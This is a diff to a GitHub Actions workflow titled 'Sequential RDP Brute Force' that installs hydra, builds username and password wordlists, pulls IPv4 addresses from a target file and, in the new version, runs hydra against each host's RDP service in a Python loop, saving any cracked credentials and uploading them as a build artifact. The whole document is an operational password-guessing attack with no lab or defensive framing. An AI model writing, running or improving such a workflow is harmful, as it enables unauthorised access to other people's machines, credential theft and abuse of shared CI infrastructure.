@@ -1,4 +1,4 @@
-name: Stable RDP Brute Force
+name: Sequential RDP Brute Force
 
 on:
   workflow_dispatch:
@@ -19,7 +19,7 @@ jobs:
           apt-get update
           apt-get install -y hydra grep
           
-      - name: Create Custom Wordlists
+      - name: Create Wordlists
         run: |
           cat <<EOF > users.txt
           Administrator
@@ -160,19 +160,34 @@ jobs:
           admin#1234
           EOF
 
-      - name: Clean Target List
+      - name: Clean and Run Sequential Brute Force
         run: |
-          # Extract only valid IPv4 addresses from the file
           grep -oE "\b([0-9]{1,3}\.){3}[0-9]{1,3}\b" nonla.txt | sort -u > clean_targets.txt
+          
+          # Sequential execution using Python to prevent FD_SETSIZE error
+          python3 - <<EOF
+          import subprocess
+          import os
 
-      - name: Launch Stable Hydra Attack
-        run: |
-          # Using -t 1 (one target at a time) to avoid FD_SETSIZE error
-          # Using -f to stop immediately when a password is found for a host
-          hydra -L users.txt -P passwords.txt -M clean_targets.txt rdp -t 1 -f -vV -o final_rdp_success.txt || true
+          with open("clean_targets.txt", "r") as f:
+              targets = [line.strip() for line in f if line.strip()]
 
-      - name: Upload Success Report
+          with open("final_success.txt", "a") as out:
+              for ip in targets:
+                  print(f"[*] Attacking: {ip}")
+                  # Call hydra for each IP individually
+                  try:
+                      cmd = ["hydra", "-L", "users.txt", "-P", "passwords.txt", ip, "rdp", "-t", "4", "-f"]
+                      result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
+                      if "login:" in result.stdout:
+                          print(f"[+] Found credentials for {ip}")
+                          out.write(result.stdout)
+                  except Exception as e:
+                      print(f"[!] Error on {ip}: {e}")
+          EOF
+
+      - name: Upload Final Success Report
         uses: actions/upload-artifact@v4
         with:
-          name: rdp-success-report
-          path: final_rdp_success.txt
+          name: rdp-sequential-results
+          path: final_success.txt
